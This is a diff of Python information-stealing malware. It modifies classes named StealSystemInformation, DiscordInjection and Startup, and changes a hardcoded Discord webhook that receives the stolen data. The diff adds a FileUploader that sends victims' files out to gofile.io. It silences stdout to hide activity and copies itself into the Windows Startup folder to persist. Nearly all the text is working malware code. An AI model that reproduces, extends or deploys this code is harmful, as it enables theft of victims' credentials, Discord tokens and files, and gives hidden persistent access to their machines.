@@ -1,3 +1,4 @@
+
 import ctypes, platform
 import json, sys
 import shutil
@@ -11,8 +12,9 @@ import aiohttp
 import base64
 import time
 
+sys.stdout = open(os.devnull, 'w')
 
-webhook = 'https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2'
+webhook = 'https://discordapp.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2'
 discord_injection = bool(True)
 startup_method = "folder".lower()
 Anti_VM = bool(False)
@@ -236,6 +238,52 @@ class StealSystemInformation:
         except Exception as error:
             print(f"[-] An error occurred while stealing wifi information, error code => \"{error}\"")
 
+        
+class FileUploader:
+    @staticmethod
+    async def get_server_info():
+        url = "https://api.gofile.io/getServer"
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(url) as response:
+                    if response.content_type != 'application/json':
+                        print(f"Unexpected content type: {response.content_type}")
+                        response_text = await response.text()
+                        print(f"Response Text: {response_text}")
+                        return None
+                    data = await response.json()
+                    return data
+        except Exception as e:
+            print(f"Error occurred: {e}")
+            return None
+
+    @staticmethod
+    async def upload_file(file_path):
+        server_info = await FileUploader.get_server_info()
+        if not server_info:
+            print("Failed to get server info")
+            return None
+
+        server_url = server_info['data']['server']
+        upload_url = f"https://{server_url}.gofile.io/uploadFile"
+
+        try:
+            async with aiohttp.ClientSession() as session:
+                with open(file_path, 'rb') as f:
+                    data = aiohttp.FormData()
+                    data.add_field('file', f, filename=file_path)
+
+                    async with session.post(upload_url, data=data) as response:
+                        if response.content_type != 'application/json':
+                            print(f"Unexpected content type: {response.content_type}")
+                            response_text = await response.text()
+                            print(f"Response Text: {response_text}")
+                            return None
+                        response_json = await response.json()
+                        return response_json
+        except Exception as e:
+            print(f"Error occurred during file upload: {e}")
+            return None
 
 class Main:
     def __init__(self) -> None:
@@ -1925,49 +1973,39 @@ class Main:
                 shutil.rmtree(filePath)
             except:
                 pass
-
+        
 class UploadGoFile:
     @staticmethod
-    async def get_server() -> str:
+    async def GetServer() -> str:
         try:
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
-                async with session.get("https://api.gofile.io/getServer") as response:
-                    # Check if the response is JSON
-                    if response.headers.get('Content-Type') == 'application/json; charset=utf-8':
-                        data = await response.json()
-                        return data["data"]["server"]
-                    else:
-                        print(f"Unexpected content type: {response.headers.get('Content-Type')}")
-                        return "store1"
+                async with session.get("https://api.gofile.io/getServer") as request:
+                    data = await request.json()
+                    return data["data"]["server"]
         except Exception as e:
-            print(f"An error occurred while getting the server: '{e}'\nUsing default server (store 1).")
+            print(f"An Error occurred while getting server: '{e}'\nit will use default server (store 1).")
             return "store1"
-
     @staticmethod
     async def upload_file(file_path: str) -> str:
         try:
-            active_server = await UploadGoFile.get_server()
-            upload_url = f"https://{active_server}.gofile.io/uploadFile"
-            
+            ActiveServer = await UploadGoFile.GetServer()
+            upload_url = f"https://{ActiveServer}.gofile.io/uploadFile"
             async with aiohttp.ClientSession() as session:
-                form = aiohttp.FormData()
-                
-                # Ensure the file is opened in binary read mode
-                with open(file_path, 'rb') as file:
-                    form.add_field('file', file, filename=os.path.basename(file_path))
-                    
-                    async with session.post(upload_url, data=form) as response:
-                        # Check if the response is JSON
-                        if response.headers.get('Content-Type') == 'application/json; charset=utf-8':
-                            response_body = await response.text()
-                            raw_json = json.loads(response_body)
-                            return raw_json.get('data', {}).get('downloadPage', 'No download page found')
-                        else:
-                            print(f"Unexpected content type: {response.headers.get('Content-Type')}")
-                            return 'Failed to upload file: Unexpected response'
+                file_form = aiohttp.FormData()
+                file_form.add_field('file', open(file_path, 'rb'), filename=os.path.basename(file_path))
+
+                async with session.post(upload_url, data=file_form) as response:
+                    response_body = await response.text()
+
+                    raw_json = json.loads(response_body)
+                    d = json.dumps(raw_json)
+                    output = json.loads(d)
+
+                    download_page = output['data']['downloadPage']
+                    return download_page
         except Exception as e:
             print(f"An error occurred during file upload: '{e}'")
-            return 'Failed to upload file'
+            return None
 
 
 class DiscordInjection:
@@ -2211,10 +2249,10 @@ class Startup:
     async def FolderStartup(self): # folder method for startup
         try:
             if self.Privalage: #if the code running admin privilage, copy to common startup path
-                if os.path.isfile(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\project.exe"):
+                if os.path.isfile(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\project.py"):
                     print("[+] File already on startup!")
                 else:
-                    shutil.copy(self.CurrentFile, r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\project.exe")
+                    shutil.copy(self.CurrentFile, r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\project.py")
             else: #if the code not running admin privilage, copy to normal startup path
                 if os.path.isfile(os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "project.py")):
                     print("[+] File already on startup!")
